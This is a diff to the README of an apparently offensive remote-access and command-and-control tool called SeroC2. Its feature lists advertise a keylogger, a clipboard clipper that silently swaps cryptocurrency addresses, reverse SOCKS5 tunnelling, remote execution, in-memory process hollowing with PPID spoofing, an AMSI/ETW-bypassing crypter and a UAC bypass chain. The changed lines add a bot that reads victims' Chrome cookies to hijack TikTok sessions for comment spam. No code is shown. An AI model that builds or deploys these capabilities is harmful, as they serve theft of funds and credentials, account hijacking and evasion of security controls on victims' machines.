@@ -52,7 +52,7 @@ Open `Sero.sln` in **Visual Studio 2026**, build (`F6`), and launch `SeroServer.
 | Keylogger | ✅ | Low-level WH_KEYBOARD_LL hook, offline disk logging (by date), file browser UI, save .txt |
 | Crypto Clipper | ✅ | Monitors clipboard for BTC/ETH/LTC/TRX/SOL/XMR/XRP/DASH/BCH/BNB, silent address swap |
 | Process Manager | ✅ | List all processes with native Windows icons, memory, search, force-kill |
-| TikTok Bot | ✅ | Multi-client panel: CDP auto-signup via Google OAuth (Chrome hidden), account inventory, comment broadcast with rotation across accounts |
+| TikTok Bot | ✅ | Multi-client panel: CDP session detection (checks Chrome cookies before signup), auto-signup via Google OAuth (Chrome hidden), account inventory, comment broadcast with rotation across accounts |
 | SOCKS5 Proxy | ✅ | Reverse SOCKS5 — tunnel traffic through the remote machine |
 | File Execute | ✅ | Remote execution of arbitrary files |
 | RunPE / HollowExec | ✅ | In-memory PE injection with PPID spoofing |
@@ -507,7 +507,7 @@ SeroC2/
 - [x] Crypto Clipper — BTC / ETH / BNB / LTC / TRX / SOL / XMR / XRP / DASH / BCH, global server tab, auto-push on connect
 - [x] Process Manager — native Windows icons (SHGetFileInfo), memory, search, force-kill
 - [x] Reverse SOCKS5 proxy — tunnel traffic through the remote machine, local SOCKS5 listener
-- [x] TikTok Bot — multi-client panel: CDP auto-signup via Google OAuth (Chrome hidden, no HVNC), account inventory, comment broadcast with rotation across all accounts; cookie auto-flows from signup to comment panel, post comments on videos and livestreams using an existing session, auto-detect session on machine
+- [x] TikTok Bot — multi-client panel: CDP session detection (navigates to tiktok.com and reads Chrome cookies via `Network.getCookies` — skips signup if session exists), CDP auto-signup via Google OAuth (Chrome hidden, no HVNC), account inventory, comment broadcast with rotation across all accounts; cookie auto-flows from signup to comment panel, post comments on videos and livestreams using an existing session
 - [x] Stub size −2 MB — replaced `System.Management` WMI with direct registry P/Invoke (`RegSetKeyValueW`); stub now **7.44 MB** NativeAOT (all features included)
 - [x] Polymorphic Crypter — AES-256-CBC, LZNT1, AMSI+ETW bypass *(closed-source)*
 - [x] UAC Bypass chain — computerdefaults → fodhelper → sdclt → mmc *(closed-source)*
